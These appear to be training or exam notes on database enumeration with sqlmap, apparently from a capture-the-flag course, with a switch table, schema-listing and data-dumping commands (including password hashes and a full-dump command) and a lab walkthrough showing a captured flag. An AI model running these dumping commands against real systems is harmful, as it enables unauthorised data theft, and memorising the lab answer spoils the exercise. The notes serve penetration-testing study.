# Section 7 — Database Enumeration

---

## Basic Enumeration Switches

| Switch | What it returns | Underlying SQL |
|--------|----------------|----------------|
| `--banner` | DB version string | `SELECT VERSION()` |
| `--current-user` | DB user running the query | `SELECT CURRENT_USER()` |
| `--current-db` | Database name in use | `SELECT DATABASE()` |
| `--is-dba` | TRUE if user has DBA privileges | `SELECT super_priv FROM mysql.user WHERE user=...` |
| `--hostname` | DB server hostname | `SELECT @@HOSTNAME` |
| `--users` | All DB users | `SELECT user FROM mysql.user` |
| `--passwords` | All user password hashes | `SELECT authentication_string FROM mysql.user` |

```bash
# One-liner — full initial enumeration
sqlmap -u "http://TARGET/?id=1" --banner --current-user --current-db --is-dba
```

> sqlmap stores detected injection points in session files. Subsequent runs against the same target skip detection and jump straight to enumeration.

---

## Table & Column Enumeration

```bash
# List databases
sqlmap -u "TARGET" --dbs

# List tables in a specific DB
sqlmap -u "TARGET" --tables -D testdb

# List columns of a specific table
sqlmap -u "TARGET" --columns -T users -D testdb
```
> Three-step schema enumeration. Run each in sequence: first `--dbs` to find the interesting database, then `--tables -D <db>` to find the target table, then `--columns` to see what data it holds. Replace `TARGET`, `testdb`, and `users` with your target's values.

---

## Dumping Data

```bash
# Dump entire table
sqlmap -u "TARGET" --dump -T users -D testdb

# Dump specific columns only
sqlmap -u "TARGET" --dump -T users -D testdb -C name,surname

# Dump specific row range (ordinal positions)
sqlmap -u "TARGET" --dump -T users -D testdb --start=2 --stop=3

# Conditional WHERE
sqlmap -u "TARGET" --dump -T users -D testdb --where="name LIKE 'f%'"

# Dump all tables in a DB
sqlmap -u "TARGET" --dump -D testdb

# Dump EVERYTHING (skip system DBs)
sqlmap -u "TARGET" --dump-all --exclude-sysdbs
```
> Dump variants from targeted to comprehensive. Use `-C name,surname` to limit columns and speed up blind dumps. Use `--where=` to filter rows. `--start`/`--stop` paginate by row number — useful for slow blind injection. `--dump-all --exclude-sysdbs` gets everything user-created across all databases.

Output is saved as CSV to `~/.local/share/sqlmap/output/<host>/dump/<db>/<table>.csv`.

```bash
# Alternative dump formats
sqlmap ... --dump --dump-format=HTML
sqlmap ... --dump --dump-format=SQLITE
```
> Saves dumped data in a different format. HTML is readable in a browser. SQLite lets you run SQL queries on the dumped data offline with `sqlite3`. Default format is CSV.

> SQLite format is useful for offline analysis with `sqlite3` queries.

---

## Inband vs Blind Queries

sqlmap's `queries.xml` defines two query variants for each task:

- **inband** — used for UNION and error-based injection. The full result comes back in one request.
- **blind** — used for boolean and time-based injection. Data is retrieved one row at a time, one bit at a time, using `LIMIT %d,1`.

You do not choose between them. sqlmap picks the right one based on the detected injection type. Inband is always faster.

---

## DB User vs OS User

> The `root` user in the database (DB) context has no relation to the operating system (OS) root account. DB root has full DB privileges but limited OS access. Writing files requires the FILE privilege and a permissive `secure_file_priv` setting. Do not assume DBA equals full system compromise — verify with `--os-shell` or LOAD_FILE checks.

---

## Lab — Case 1

**Target:** `154.57.164.72:30732`

### Q1 — Contents of `flag1` in `testdb`

```bash
sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag1 -D testdb
```
> Dumps the `flag1` table from the `testdb` database via UNION injection. `--no-cast` is required here to prevent silent failures. Replace the IP, port, table, and database names for other targets.

> `--no-cast` needed — without it the full UNION technique silently fails with "the SQL query provided does not return any output."

**flag1:** `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

---

## Exam Notes

- Always run `--banner --current-user --current-db --is-dba` first to get the lay of the land
- `--no-cast` is the fix for "SQL query provided does not return any output" — try it before anything else
- For large dumps: `--start`/`--stop` lets you paginate; useful when blind injection is slow
- `--dump-all --exclude-sysdbs` is the "give me everything" command — use it during full pentests, not CTFs
- sqlmap caches detected injection points — delete `~/.local/share/sqlmap/output/<host>/` to force re-detection
